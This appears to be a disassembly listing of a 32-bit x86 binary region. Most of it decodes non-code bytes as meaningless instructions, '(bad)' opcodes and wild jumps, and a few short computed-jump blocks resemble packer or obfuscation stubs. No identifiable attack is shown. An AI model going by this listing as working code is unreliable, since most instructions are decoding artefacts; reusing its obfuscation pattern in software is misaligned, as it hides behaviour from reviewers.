  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	jno    0x40e7ee
  40e7f1:	inc    ebp
  40e7f2:	push   0x42
  40e7f4:	mov    esi,0x14d21818
  40e7f9:	sbb    BYTE PTR [eax],bl
  40e7fb:	push   ds
  40e7fc:	retf   0x26c0
  40e7ff:	or     al,0x45
  40e801:	mov    dl,0xbf
  40e803:	and    eax,0xf4aa3e38
  40e808:	imul   ebp,esi,0xffffffc4
  40e80b:	xchg   DWORD PTR [eax-0x20],esi
  40e80e:	arpl   WORD PTR ds:0x847f23d9,bp
  40e814:	push   edi
  40e815:	fdiv   st,st(1)
  40e817:	pop    esi
  40e818:	mov    eax,ds:0x64996221
  40e81d:	push   ds
  40e81e:	call   0x45c68fc5
  40e823:	sbb    bl,BYTE PTR [edi-0x54]
  40e826:	test   eax,0x909b8240
  40e82b:	xor    eax,0xba25fd9b
  40e830:	pop    ds
  40e831:	bound  esp,QWORD PTR [ebx-0x604beacd]
  40e837:	mul    BYTE PTR ds:0x61e9edb7
  40e83d:	dec    eax
  40e83f:	jbe    0x40e8ba
  40e841:	jne    0x40e7ed
  40e843:	mov    bl,0x58
  40e845:	sub    al,0x3c
  40e847:	daa    
  40e848:	(bad)  
  40e84a:	mov    cl,0x85
  40e84c:	mov    ebp,0x6f235b5c
  40e851:	jb     0x40e8a6
  40e853:	cmp    edx,ebx
  40e855:	cmp    BYTE PTR [esi-0x1],0x59
  40e859:	add    BYTE PTR [edi],cl
  40e85b:	loopne 0x40e8c0
  40e85d:	fcomi  st,st(1)
  40e85f:	popf   
  40e860:	hlt    
  40e861:	adc    eax,0xe6f01518
  40e866:	scas   eax,DWORD PTR es:[edi]
  40e867:	cld    
  40e868:	mov    bh,0xd7
  40e86a:	jb     0x40e8bb
  40e86c:	push   ss
  40e86d:	xor    al,BYTE PTR [edx+edi*8+0x7df16455]
  40e874:	mov    WORD PTR [edi+0x63],ss
  40e877:	xchg   BYTE PTR [edi+ecx*8-0x59],cl
  40e87b:	xchg   ecx,eax
  40e87c:	and    eax,0x56a7a26c
  40e881:	sbb    eax,0x90287aa9
  40e886:	jo     0x40e859
  40e888:	fisubr DWORD PTR fs:[edx]
  40e88b:	shr    ah,1
  40e88d:	adc    eax,0x18e1ff54
  40e892:	pop    edi
  40e893:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e894:	fwait
  40e895:	inc    DWORD PTR [ebx]
  40e897:	add    dh,al
  40e899:	xchg   edx,eax
  40e89a:	mov    ch,0x36
  40e89c:	leave  
  40e89d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e89e:	cmp    BYTE PTR [edi-0x79],al
  40e8a1:	(bad)  [ebx+0x38908680]
  40e8a7:	ins    BYTE PTR es:[edi],dx
  40e8a8:	xchg   BYTE PTR [edi+0x9f006e],dl
  40e8ae:	cmp    esp,ebx
  40e8b0:	lahf   
  40e8b1:	cmp    DWORD PTR [edi-0x1a],esp
  40e8b4:	retf   0x9a30
  40e8b7:	hlt    
  40e8b8:	and    DWORD PTR [esp+edx*1],edx
  40e8bb:	mov    edi,0xd5b6490
  40e8c0:	push   eax
  40e8c1:	fild   WORD PTR [edi+0x22]
  40e8c4:	jge    0x40e86c
  40e8c6:	cmp    DWORD PTR [edx+0x36c8cdd2],eax
  40e8cc:	stos   DWORD PTR es:[edi],eax
  40e8cd:	jae    0x40e944
  40e8cf:	inc    edi
  40e8d0:	or     bh,BYTE PTR [edi]
  40e8d2:	jnp    0x40e8e2
  40e8d4:	inc    BYTE PTR [ecx]
  40e8d6:	fild   DWORD PTR [edi+0x6bfd5c1c]
  40e8dc:	mov    edi,cr4
  40e8df:	lahf   
  40e8e0:	push   0xe6b52b5
  40e8e5:	or     esp,edx
  40e8e7:	xchg   edi,eax
  40e8e8:	fld    TBYTE PTR [ecx]
  40e8ea:	out    0xb1,eax
  40e8ec:	je     0x40e8e9
  40e8ee:	jmp    0x76a4:0x86816dd2
  40e8f5:	js     0x40e894
  40e8f7:	and    al,0xf5
  40e8f9:	stos   DWORD PTR es:[edi],eax
  40e8fa:	loopne 0x40e8d2
  40e8fc:	push   esi
  40e8fd:	dec    ecx
  40e8fe:	fisubr DWORD PTR [edi+0x66]
  40e901:	push   ss
  40e902:	mov    BYTE PTR [ecx+0x3f],bh
  40e905:	push   cs
  40e906:	mov    cs,WORD PTR [ecx+eax*2+0x42a5629c]
  40e90d:	add    al,0x93
  40e90f:	mov    eax,0x7b22b43c
  40e914:	sub    BYTE PTR [esi+0x29],dh
  40e917:	mov    BYTE PTR [ecx+0x44d47c77],ch
  40e91d:	push   ebx
  40e91e:	cs pop es
  40e920:	jge    0xc0ce155c
  40e926:	add    edx,DWORD PTR [eax-0x50]
  40e929:	mov    edx,0x59ec16b8
  40e92e:	pop    ebp
  40e92f:	sbb    al,BYTE PTR [edx]
  40e931:	cwde   
  40e932:	call   0xacfab16d
  40e937:	push   ebx
  40e938:	adc    ecx,esi
  40e93a:	lods   al,BYTE PTR ds:[esi]
  40e93b:	loop   0x40e9b3
  40e93d:	inc    ecx
  40e93e:	outs   dx,DWORD PTR ds:[esi]
  40e93f:	mov    ds:0x23194d96,eax
  40e944:	in     al,0x70
  40e946:	adc    DWORD PTR [edi+0x45edf3f6],eax
  40e94c:	cwde   
  40e94d:	lds    ebx,FWORD PTR [eax-0x19]
  40e950:	mov    ebx,0x23577690
  40e955:	int3   
  40e956:	inc    eax
  40e957:	pop    edi
  40e958:	dec    edi
  40e959:	and    esp,DWORD PTR [ecx+eax*8+0x50]
  40e95d:	in     eax,0xd
  40e95f:	push   ecx
  40e960:	es jno 0x40e9d2
  40e963:	xchg   edx,eax
  40e964:	mov    eax,0x200f37f5
  40e969:	and    eax,0x8edc9de8
  40e96e:	and    ah,bh
  40e970:	xor    al,BYTE PTR [ecx+eiz*1+0x7a5f62ed]
  40e977:	lea    esp,[edi-0x7c]
  40e97a:	xor    cl,BYTE PTR [ecx]
  40e97c:	push   ecx
  40e97d:	add    BYTE PTR [ecx-0x5e],bh
  40e980:	lods   al,BYTE PTR ds:[esi]
  40e981:	(bad)  
  40e982:	push   es
  40e983:	outs   dx,BYTE PTR ds:[esi]
  40e984:	push   ebx
  40e985:	push   ebp
  40e986:	sub    eax,0x5eeacfa3
  40e98b:	idiv   DWORD PTR [ecx-0x48]
  40e98e:	jl     0x40e958
  40e990:	clc    
  40e991:	push   edx
  40e992:	mov    BYTE PTR [ecx+ebp*2+0x34],dh
  40e996:	aad    0x18
  40e998:	in     al,dx
  40e999:	inc    esi
  40e99a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e99b:	imul   esi,ecx,0x39
  40e99e:	cmc    
  40e99f:	xor    al,0x24
  40e9a1:	sbb    DWORD PTR [eax],ebp
  40e9a3:	test   al,0x42
  40e9a5:	mov    cl,0xb7
  40e9a7:	lahf   
  40e9a8:	mov    esi,0x81360bc8
  40e9ad:	jno    0x40e97f
  40e9af:	popf   
  40e9b0:	pop    edi
  40e9b1:	int    0xbe
  40e9b3:	ja     0x40ea25
  40e9b5:	adc    DWORD PTR [eax],edi
  40e9b7:	add    DWORD PTR [ecx],0xffffffd1
  40e9ba:	lea    edx,[ecx+0x79]
  40e9bd:	pusha  
  40e9be:	and    al,0x65
  40e9c0:	mov    ebp,0xd51d5939
  40e9c5:	test   DWORD PTR ds:0x6d2f65b6,esp
  40e9cb:	sub    eax,0xc11679a5
  40e9d0:	pusha  
  40e9d1:	xlat   BYTE PTR ds:[ebx]
  40e9d2:	inc    BYTE PTR [esi-0x79]
  40e9d5:	ficomp WORD PTR [edi]
  40e9d7:	mov    eax,ds:0x6005372
  40e9dc:	jnp    0x40ea06
  40e9de:	inc    eax
  40e9df:	das    
  40e9e0:	and    BYTE PTR [ecx-0x5a5f456e],0x58
  40e9e7:	mov    dl,bl
  40e9e9:	data16 cmp al,0x37
  40e9ec:	mov    al,ds:0x5e6e4cd6
  40e9f1:	sbb    eax,0x3f9c942b
  40e9f6:	mov    dl,ah
  40e9f8:	pop    esp
  40e9f9:	xchg   ebp,eax
  40e9fa:	bound  edx,QWORD PTR [esi+edx*1]
  40e9fd:	call   0x1bea33d1
  40ea02:	shr    DWORD PTR [edx+0x27],cl
  40ea05:	push   edx
  40ea06:	(bad)  
  40ea08:	xor    edx,esp
  40ea0a:	push   eax
  40ea0b:	and    al,0xc7
  40ea0d:	jnp    0x40e9dc
  40ea0f:	loop   0x40e9c4
  40ea11:	lock jmp 0x40ea26
  40ea14:	mov    esp,0xa4e997ca
  40ea19:	jae    0x40ea95
  40ea1b:	ins    BYTE PTR es:[edi],dx
  40ea1c:	int3   
  40ea1d:	xchg   edx,eax
  40ea1e:	adc    BYTE PTR [esi],dh
  40ea20:	ss fucomp st(2)
  40ea23:	test   cl,dh
  40ea25:	dec    ecx
  40ea26:	retf   0xd04a
  40ea29:	call   0x71c9:0xe8b8809f
  40ea30:	loop   0x40ea7b
  40ea32:	shr    al,0x8
  40ea35:	fs jl  0x40eab1
  40ea38:	aas    
  40ea39:	sub    al,0x2a
  40ea3b:	push   ecx
  40ea3c:	dec    edi
  40ea3d:	sbb    DWORD PTR [esi+0x4e],ebx
  40ea40:	test   al,0x90
  40ea42:	push   0x989ac2ab
  40ea47:	int3   
  40ea48:	add    BYTE PTR [ebx],0x2b
  40ea4b:	xchg   ecx,eax
  40ea4c:	ja     0x40ea52
  40ea4e:	aaa    
  40ea4f:	and    edx,DWORD PTR [edi]
  40ea51:	in     al,dx
  40ea52:	xor    al,0xfa
  40ea54:	jecxz  0x40ea03
  40ea56:	dec    ecx
  40ea57:	sub    al,0xdc
  40ea59:	pop    edx
  40ea5a:	outs   dx,DWORD PTR ds:[esi]
  40ea5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea5c:	sub    eax,0xc3de05a
  40ea61:	cli    
  40ea62:	call   0x8cbf721e
  40ea67:	rol    DWORD PTR [edx+0x8],0xe7
  40ea6b:	test   ebp,edi
  40ea6d:	push   ebp
  40ea6e:	inc    esi
  40ea6f:	es jl  0x40ea70
  40ea72:	mov    WORD PTR [ebx-0x4e70c01],?
  40ea78:	or     DWORD PTR [eax+ebp*8],edx
  40ea7b:	icebp  
  40ea7c:	mov    WORD PTR [esp+edi*4+0x5c],gs
  40ea80:	jg     0x40eaa9
  40ea82:	sub    al,0xe9
  40ea84:	(bad)  
  40ea86:	inc    ebp
  40ea87:	xchg   DWORD PTR [ebp+0x3],ebx
  40ea8a:	push   edx
  40ea8b:	jmp    0xd496:0x642d5af5
  40ea92:	mov    bh,0xfd
  40ea94:	ror    BYTE PTR [ebp-0x4d],cl
  40ea97:	mov    bh,0xc7
  40ea99:	xchg   ecx,eax
  40ea9a:	repz dec eax
  40ea9c:	aam    0xe4
  40ea9e:	push   esi
  40ea9f:	in     al,dx
  40eaa0:	das    
  40eaa1:	or     al,0x33
  40eaa3:	shl    bh,cl
  40eaa5:	test   DWORD PTR [ebx+0x4225a815],0xd4928b00
  40eaaf:	add    DWORD PTR [eax],eax
  40eab1:	add    BYTE PTR [ebx],ch
  40eab3:	ror    BYTE PTR [ebx+0x48a1045],1
  40eab9:	push   es
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0xacaa14b9
  40eaf1:	sbb    edi,esi
  40eaf3:	mov    esi,0x1818b8fd
  40eaf8:	rcl    BYTE PTR [eax+ebx*1],cl
  40eafb:	sbb    BYTE PTR [ecx],dh
  40eafd:	pop    ecx
  40eafe:	mov    bl,0xf8
  40eb00:	dec    ebx
  40eb01:	jmp    0xdb0bfcdc
  40eb06:	xor    BYTE PTR [esi],0x77
  40eb09:	ret    0x987c
  40eb0c:	sub    al,0x69
  40eb0e:	bound  edx,QWORD PTR [eax+ebx*8]
  40eb11:	push   eax
  40eb12:	sti    
  40eb13:	jo     0x40eb7d
  40eb15:	jbe    0x40eaad
  40eb17:	lods   eax,DWORD PTR ds:[esi]
  40eb18:	pop    esp
  40eb19:	out    0xd3,al
  40eb1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb1c:	fimul  WORD PTR [eax-0x20]
  40eb1f:	dec    esp
  40eb21:	clc    
  40eb22:	and    al,0x63
  40eb24:	xor    ebp,DWORD PTR [edi-0x61]
  40eb27:	(bad)  
  40eb28:	adc    al,0x3c
  40eb2a:	jae    0x40eb16
  40eb2c:	dec    ebx
  40eb2d:	xor    ch,cl
  40eb2f:	ror    DWORD PTR [edx+edx*2+0x6c80160e],1
  40eb36:	mov    edx,0xfce95d28
  40eb3b:	pop    esi
  40eb3c:	xlat   BYTE PTR ds:[ebx]
  40eb3d:	aam    0x5c
  40eb3f:	mov    ds:0xf8080d11,eax
  40eb44:	adc    bl,BYTE PTR [eax-0x1f]
  40eb47:	or     eax,0x72b0a09f
  40eb4c:	fisub  DWORD PTR [esi+0x19]
  40eb4f:	pop    es
  40eb50:	sar    BYTE PTR [eax],cl
  40eb52:	inc    edi
  40eb53:	out    dx,al
  40eb54:	jno    0x40eba5
  40eb56:	mov    al,0xc0
  40eb58:	xor    dl,BYTE PTR [edx-0x7d99dbf6]
  40eb5e:	aam    0xb6
  40eb60:	push   edi
  40eb61:	xor    ecx,esp
  40eb63:	push   esi
  40eb64:	mov    DWORD PTR ds:0xbe14dc1d,ecx
  40eb6a:	aas    
  40eb6b:	jnp    0x40eb04
  40eb6d:	and    eax,0x702a0c10
  40eb72:	out    dx,al
  40eb73:	lock pop es
  40eb75:	sti    
  40eb76:	fadd   st,st(7)
  40eb78:	cli    
  40eb79:	leave  
  40eb7a:	dec    esi
  40eb7b:	cli    
  40eb7c:	push   esp
  40eb7d:	(bad)  
  40eb7e:	ja     0x40eb84
  40eb80:	and    eax,0xa67a247
  40eb85:	repz xor DWORD PTR [eax+eax*1],esp
  40eb89:	xchg   ecx,eax
  40eb8a:	sub    eax,0x9b0b7267
  40eb8f:	arpl   WORD PTR [eax],sp
  40eb91:	mov    BYTE PTR [ecx+ecx*4-0xff06992],dh
  40eb98:	call   0x69a66587
  40eb9d:	fwait
  40eb9e:	test   ecx,edi
  40eba0:	test   DWORD PTR [edi],0x63868343
  40eba6:	in     eax,0x4d
  40eba8:	xlat   BYTE PTR ds:[ebx]
  40eba9:	sub    ecx,ebx
  40ebab:	jmp    0x40ebbf
  40ebad:	cmp    DWORD PTR [ecx-0x4c7ba96],edi
  40ebb3:	inc    edx
  40ebb4:	sbb    eax,0x9cebe254
  40ebb9:	lods   eax,DWORD PTR ds:[esi]
  40ebba:	js     0x40ebbc
  40ebbc:	and    cl,BYTE PTR [bp+si+0x26]
  40ebc0:	jns    0x40eba2
  40ebc2:	loop   0x40ec3e
  40ebc4:	daa    
  40ebc5:	sub    al,0x4e
  40ebc7:	dec    ecx
  40ebc8:	add    DWORD PTR [eax],edi
  40ebca:	sub    eax,0xc1c20bbc
  40ebcf:	mov    eax,0x5867f88b
  40ebd4:	sti    
  40ebd5:	lods   al,BYTE PTR ds:[esi]
  40ebd6:	xor    DWORD PTR [ecx+0x4a],0x56
  40ebda:	or     al,0xad
  40ebdc:	shl    DWORD PTR [edx],0xa1
  40ebdf:	push   ds
  40ebe0:	cmp    ch,ah
  40ebe2:	cmp    al,0x73
  40ebe4:	cwde   
  40ebe5:	xor    BYTE PTR [ecx-0x62511647],al
  40ebeb:	add    bl,BYTE PTR [edx+0x51]
  40ebee:	iret   
  40ebef:	pop    esp
  40ebf0:	pop    esi
  40ebf1:	xor    BYTE PTR [edx-0x4b],dh
  40ebf4:	in     al,0xb4
  40ebf6:	ds push 0xdef45398
  40ebfc:	fwait
  40ebfd:	sbb    al,0x98
  40ebff:	arpl   WORD PTR [edi+0x11d918c],bx
  40ec05:	fistp  WORD PTR [ebp-0x7c]
  40ec08:	jl     0x40ebdf
  40ec0a:	pop    esi
  40ec0b:	xor    dh,BYTE PTR [si+0x6acc]
  40ec10:	mov    esp,0x63feb2aa
  40ec15:	cli    
  40ec16:	daa    
  40ec17:	jb     0x40ec38
  40ec19:	nop
  40ec1a:	jns    0x40ebeb
  40ec1c:	cmp    DWORD PTR [eax-0x15],edi
  40ec1f:	jl     0x40ec42
  40ec21:	mov    ds:0xf914633d,eax
  40ec26:	test   al,0x2
  40ec28:	xchg   edx,eax
  40ec29:	pop    ss
  40ec2a:	and    edi,DWORD PTR [ecx+0x25]
  40ec2d:	popf   
  40ec2e:	sub    al,0x15
  40ec30:	mov    ah,0x45
  40ec32:	mov    edx,DWORD PTR [ebx]
  40ec34:	adc    al,0xc4
  40ec36:	mov    ds:0x27aeb596,al
  40ec3b:	leave  
  40ec3c:	cmp    ch,0x88
  40ec3f:	add    eax,0x860bb67f
  40ec44:	and    eax,0x2660dbf3
  40ec49:	fwait
  40ec4a:	sahf   
  40ec4b:	popf   
  40ec4c:	jno    0x40ec34
  40ec4e:	shl    BYTE PTR [edi-0x468d6e92],cl
  40ec54:	or     BYTE PTR [ebx],cl
  40ec56:	pusha  
  40ec57:	mov    ds:0x423f07d7,eax
  40ec5c:	test   al,0xae
  40ec5e:	add    eax,0x1a22a65c
  40ec63:	dec    eax
  40ec64:	int    0x68
  40ec66:	cdq    
  40ec67:	pop    esi
  40ec68:	sub    al,0x37
  40ec6a:	xchg   DWORD PTR [esi],edi
  40ec6c:	shl    DWORD PTR [ecx],0x59
  40ec6f:	scas   eax,DWORD PTR es:[edi]
  40ec70:	ins    BYTE PTR es:[edi],dx
  40ec71:	ins    DWORD PTR es:[edi],dx
  40ec72:	mov    ebp,0x11ec1cd5
  40ec77:	sub    al,0xc1
  40ec79:	mov    BYTE PTR [ebx],bl
  40ec7b:	mov    ah,0x75
  40ec7d:	dec    ecx
  40ec7e:	lea    ebx,[edx-0x6b]
  40ec81:	cld    
  40ec82:	add    edi,DWORD PTR [edx+0x4]
  40ec85:	inc    edi
  40ec86:	xchg   ebx,eax
  40ec87:	ss gs std 
  40ec8a:	mov    al,0x3d
  40ec8c:	or     DWORD PTR ds:0x7c54d885,edx
  40ec92:	stos   DWORD PTR es:[edi],eax
  40ec93:	or     esp,ebx
  40ec95:	mov    esi,0x617952ff
  40ec9a:	mov    cs,ebp
  40ec9c:	adc    BYTE PTR [edx+0xc],cl
  40ec9f:	jb     0x40ec74
  40eca1:	test   eax,0x6d723ea8
  40eca6:	xor    bh,ah
  40eca8:	sbb    BYTE PTR [edx+0x4f],ch
  40ecab:	daa    
  40ecac:	test   BYTE PTR [ebx],bh
  40ecae:	dec    edx
  40ecaf:	inc    esi
  40ecb0:	dec    edx
  40ecb1:	loop   0x40ec71
  40ecb3:	adc    esi,DWORD PTR [ebx+0x53faa680]
  40ecb9:	add    DWORD PTR [eax],0xffffffae
  40ecbc:	test   eax,0xd6d0bc1f
  40ecc1:	mov    ax,0x1c3f
  40ecc5:	adc    ebp,DWORD PTR [edx+0xb589147]
  40eccb:	push   cs
  40eccc:	jl     0x40ec94
  40ecce:	ret    
  40eccf:	bound  esi,QWORD PTR [esp+eax*4-0x59]
  40ecd3:	inc    ebp
  40ecd4:	in     al,dx
  40ecd5:	mov    al,0x56
  40ecd7:	aas    
  40ecd8:	and    DWORD PTR [eax+0x2fefafea],0x55
  40ecdf:	std    
  40ece0:	mov    bh,0x80
  40ece2:	(bad)  
  40ece3:	loopne 0x40ec9f
  40ece5:	test   BYTE PTR [eax+0x1c85d788],bh
  40eceb:	mov    dl,0xf
  40eced:	in     eax,dx
  40ecee:	xchg   edx,eax
  40ecef:	leave  
  40ecf0:	inc    edi
  40ecf1:	loope  0x40ec92
  40ecf3:	retf   0x6341
  40ecf6:	div    al
  40ecf8:	shl    BYTE PTR [ebx-0x6fe9a4b5],cl
  40ecfe:	mov    al,0x32
  40ed00:	repz (bad) [edx-0x1]
  40ed04:	ret    
  40ed05:	dec    eax
  40ed06:	xchg   ebx,eax
  40ed07:	je     0x40ece4
  40ed09:	test   edx,ecx
  40ed0b:	std    
  40ed0c:	int3   
  40ed0d:	jmp    FWORD PTR [ebx-0x63a9d8ee]
  40ed13:	mov    ebx,0xb306e693
  40ed18:	out    0x46,eax
  40ed1a:	std    
  40ed1b:	dec    ecx
  40ed1c:	sbb    DWORD PTR ss:[edx],0x57
  40ed20:	jnp    0x40ed7c
  40ed22:	loop   0x40ed57
  40ed24:	cmp    al,cl
  40ed26:	aad    0xd7
  40ed28:	fdiv   st,st(4)
  40ed2a:	inc    ecx
  40ed2b:	lock push eax
  40ed2d:	push   cs
  40ed2e:	fld    st(6)
  40ed30:	pushf  
  40ed31:	inc    ecx
  40ed32:	xchg   esp,eax
  40ed33:	sub    BYTE PTR ds:0x1436faff,0x3a
  40ed3a:	jmp    0x3847:0x7e014504
  40ed41:	sub    BYTE PTR [ebp+0x77],al
  40ed44:	jno    0x40ed4d
  40ed46:	call   0xe1b57896
  40ed4b:	mov    BYTE PTR [edi+0x237fa18d],dh
  40ed51:	fidivr WORD PTR [ebx-0x34829579]
  40ed57:	mov    edx,0x64d6dd2
  40ed5c:	ss into 
  40ed5e:	ror    BYTE PTR [edx],0x7f
  40ed61:	pop    ebx
  40ed62:	sbb    ecx,DWORD PTR [ebp+0x3d82ecde]
  40ed68:	pop    es
  40ed69:	popf   
  40ed6a:	mov    ds:0x6d23b586,eax
  40ed6f:	cmp    esi,ebx
  40ed71:	or     al,BYTE PTR [ecx-0xc1c5fe2]
  40ed77:	outs   dx,DWORD PTR ds:[esi]
  40ed78:	adc    edi,DWORD PTR [esi-0x408faa2a]
  40ed7e:	jmp    0xc866b3b3
  40ed83:	mul    DWORD PTR [ebx-0xa7feeb4]
  40ed89:	mov    edi,0x5a9c0495
  40ed8e:	cmp    eax,0x96715c52
  40ed93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed94:	mov    esp,0xf3b78e18
  40ed99:	lea    ebp,[ebx]
  40ed9b:	xchg   edi,eax
  40ed9c:	mov    ss,WORD PTR [ecx+0x869dad3]
  40eda2:	pop    ecx
  40eda3:	lea    ecx,[ecx+eax*1+0x350559e6]
  40edaa:	mov    eax,DWORD PTR [ebp-0xc]
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx-0x7855ed90]
  40edd3:	push   cs
  40edd4:	sub    eax,0x18b2b7be
  40edd9:	sbb    dl,dl
  40eddb:	adc    al,0x18
  40eddd:	sbb    BYTE PTR [ecx],cl
  40eddf:	add    ebx,DWORD PTR [esi+esi*8-0x3b]
  40ede3:	rol    BYTE PTR [edx+0xfa764e7],1
  40ede9:	jl     0x40edb0
  40edeb:	mov    ch,0xb1
  40eded:	xchg   esi,eax
  40edee:	push   edi
  40edef:	mov    ebp,0xfb252a55
  40edf4:	adc    eax,0x31434f6f
  40edf9:	push   ss
  40edfa:	stos   DWORD PTR es:[edi],eax
  40edfb:	ss into 
  40edfd:	lock ja 0x40ee17
  40ee00:	jmp    0x40edb7
  40ee02:	xor    BYTE PTR [esi+0x65504f9d],0x37
  40ee09:	clc    
  40ee0a:	xchg   BYTE PTR [ebx-0x30],bh
  40ee0d:	jb     0x40ee7c
  40ee0f:	cmp    eax,0x3b8e00b0
  40ee14:	loopne 0x40ee34
  40ee16:	pop    esi
  40ee17:	pop    edx
  40ee18:	cld    
  40ee19:	inc    ebp
  40ee1a:	xchg   esi,eax
  40ee1b:	push   es
  40ee1c:	pop    esp
  40ee1d:	jns    0x40edbe
  40ee1f:	pop    es
  40ee20:	pop    ebp
  40ee21:	aaa    
  40ee22:	mov    eax,0x8e79ecf4
  40ee27:	add    edx,DWORD PTR [esi]
  40ee29:	outs   dx,BYTE PTR ds:[esi]
  40ee2a:	arpl   WORD PTR [ecx-0x32],cx
  40ee2d:	push   0x47
  40ee2f:	ror    BYTE PTR [ebp+0x1d19b4d4],1
  40ee35:	dec    ebp
  40ee36:	in     eax,0xab
  40ee38:	xor    BYTE PTR [ecx+edi*4-0x5a],ch
  40ee3c:	adc    esp,DWORD PTR [esp+eiz*8]
  40ee3f:	and    esi,DWORD PTR [edx+0x4b21b520]
  40ee45:	inc    edx
  40ee46:	fst    st(7)
  40ee48:	add    DWORD PTR [esi+0x28],esp
  40ee4b:	ins    DWORD PTR es:[edi],dx
  40ee4c:	out    0x6,al
  40ee4e:	stos   BYTE PTR es:[edi],al
  40ee4f:	jns    0x40eeb9
  40ee51:	or     BYTE PTR [ebp+0x728dfd07],dl
  40ee57:	push   ebx
  40ee58:	lahf   
  40ee59:	shl    bl,0x17
  40ee5c:	out    0x59,al
  40ee5e:	sub    BYTE PTR [edx-0x3d9a619e],ch
  40ee64:	sub    eax,0x210aab9c
  40ee69:	mov    esp,0xe4d21c37
  40ee6e:	scas   eax,DWORD PTR es:[edi]
  40ee6f:	add    esp,DWORD PTR [ebp-0x565f9b0a]
  40ee75:	xor    DWORD PTR [edx-0x66886ad],0xffffff84
  40ee7c:	out    dx,al
  40ee7d:	popf   
  40ee7e:	or     eax,0xd35c7c98
  40ee83:	jo     0x40eef4
  40ee85:	or     edi,esp
  40ee87:	jmp    0x3ae9302c
  40ee8c:	mov    DWORD PTR [edx+0x25805a13],ebx
  40ee92:	loopne 0x40eee3
  40ee94:	add    cl,BYTE PTR [ecx]
  40ee96:	ret    
  40ee97:	jle    0x40ee9c
  40ee99:	pop    edi
  40ee9a:	out    dx,al
  40ee9b:	dec    edi
  40ee9c:	outs   dx,BYTE PTR ds:[esi]
  40ee9d:	pop    eax
  40ee9e:	in     eax,dx
  40ee9f:	or     eax,DWORD PTR [esi-0x7]
  40eea2:	mov    bl,0x56
  40eea4:	in     eax,0x6
  40eea6:	fstp   TBYTE PTR [esi]
  40eea8:	push   esi
  40eea9:	mov    ss,ebx
  40eeab:	and    bh,BYTE PTR [ebx+0x33]
  40eeae:	js     0x40eea2
  40eeb0:	(bad)  
  40eeb1:	call   0xf8e6:0x431a8db7
  40eeb8:	(bad)  
  40eeb9:	inc    esp
  40eeba:	leave  
  40eebb:	test   al,0xbc
  40eebd:	call   0x2b3664f7
  40eec2:	jbe    0x40ee5d
  40eec4:	pop    edi
  40eec5:	mov    edi,0x3729c4f7
  40eeca:	pusha  
  40eecb:	popw   es
  40eecd:	cdq    
  40eece:	mov    dl,0x8c
  40eed0:	jno    0x40eefb
  40eed2:	push   esp
  40eed3:	js     0x40eeef
  40eed5:	pop    esi
  40eed6:	ss push edx
  40eed8:	jb     0x40ee99
  40eeda:	add    DWORD PTR [ecx-0x75],ecx
  40eedd:	jp     0x40eed0
  40eedf:	out    dx,al
  40eee0:	dec    edx
  40eee1:	pop    ebx
  40eee2:	inc    ebx
  40eee3:	mov    eax,0x51c84ab8
  40eee8:	jno    0x40eeda
  40eeea:	or     eax,0xb6db674c
  40eeef:	das    
  40eef0:	clc    
  40eef1:	stos   DWORD PTR es:[edi],eax
  40eef2:	cmp    ebx,ebx
  40eef4:	dec    eax
  40eef5:	and    DWORD PTR [ebp+eiz*1+0x40596ca5],esp
  40eefc:	pop    ebx
  40eefd:	xchg   edi,eax
  40eefe:	out    0x7c,eax
  40ef00:	fmul   DWORD PTR [eax-0x4ef9a1d0]
  40ef06:	(bad)  
  40ef07:	dec    ebx
  40ef08:	mov    bh,0x98
  40ef0a:	(bad)  
  40ef0b:	jl     0x40eea7
  40ef0d:	mov    edx,0xe7bb1a12
  40ef12:	adc    al,0x26
  40ef14:	(bad)  
  40ef15:	ss dec esp
  40ef17:	ror    BYTE PTR [ebx],1
  40ef19:	loopne 0x40eea5
  40ef1b:	mov    WORD PTR [esi+0x78],cs
  40ef1e:	push   cs
  40ef1f:	popa   
  40ef20:	jno    0x40eed1
  40ef22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ef23:	in     eax,0x21
  40ef25:	dec    edi
  40ef26:	dec    ebp
  40ef27:	mov    ah,0x94
  40ef29:	cdq    
  40ef2a:	mov    esp,DWORD PTR [edx+0x2c39bea6]
  40ef30:	leave  
  40ef31:	sbb    DWORD PTR [esi],ebx
  40ef33:	out    0x73,al
  40ef35:	in     eax,dx
  40ef36:	popa   
  40ef37:	push   edi
  40ef38:	aas    
  40ef39:	xchg   DWORD PTR [edx],edi
  40ef3b:	jnp    0x40ef5c
  40ef3d:	outs   dx,BYTE PTR ds:[esi]
  40ef3e:	inc    ebx
  40ef3f:	pop    ecx
  40ef40:	pop    esi
